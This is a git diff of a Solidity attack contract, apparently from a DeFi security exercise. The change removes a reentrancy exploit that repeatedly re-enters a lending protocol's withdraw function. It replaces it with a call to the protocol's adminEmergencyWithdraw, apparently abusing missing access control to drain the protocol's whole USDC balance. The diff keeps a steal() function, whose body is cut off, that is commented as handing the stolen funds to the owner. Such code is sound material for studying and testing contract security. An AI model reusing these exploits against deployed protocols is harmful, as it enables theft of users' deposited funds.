@@ -1,55 +1,26 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.18;
 
-import "../LendingBorrowing.sol";
+import {IProtocol} from "../defiProtocol/interfaces/IProtocol.sol";
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "hardhat/console.sol";
 
 contract AttackContract {
     IERC20 private s_usdc;
-    LendingBorrowing private lendingBorrowing;
     address private owner;
 
-    constructor(address _usdcAddress, address _lendingBorrowingAddress) {
+    constructor(address _usdcAddress) {
         s_usdc = IERC20(_usdcAddress);
-        lendingBorrowing = LendingBorrowing(_lendingBorrowingAddress);
         owner = msg.sender;
     }
 
-    function attack(uint256 amount) public {
+    function attack(address protocolAddress) public {
         // Deposits tokens to the LendingBorrowing contract
-        s_usdc.approve(address(lendingBorrowing), amount);
-        lendingBorrowing.deposit(amount);
-
-        // Run the attack to exploit re-entrency in withdraw function
-        // lendingBorrowing.withdraw(amount);
-
-        lendingBorrowing.adminEmergencyWithdraw(
-            s_usdc.balanceOf(address(lendingBorrowing))
-        );
-
-        //uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
-        //console.log("balance: %s", balance);
+        // get usdc balance of protocol
+        uint256 usdcBalance = s_usdc.balanceOf(protocolAddress);
+        IProtocol(protocolAddress).adminEmergencyWithdraw(usdcBalance);
     }
-
-    // This is the function that gets called recursively by the withdraw function
-    function receiveTokens(address sender, uint256 amount) public {
-        uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
-        //console.log("balance: %s", balance);
-
-        if (balance > amount) {
-            console.log("reentry");
-            lendingBorrowing.withdraw(amount);
-        }
-    }
-
-    // fallback() external payable {
-    //     console.log("Fallback called");
-    //     if (address(lendingBorrowing).balance >= msg.value) {
-    //         lendingBorrowing.withdraw(msg.value);
-    //     }
-    // }
 
     // The owner of the contract withdraw the stolen funds
     function steal() public {
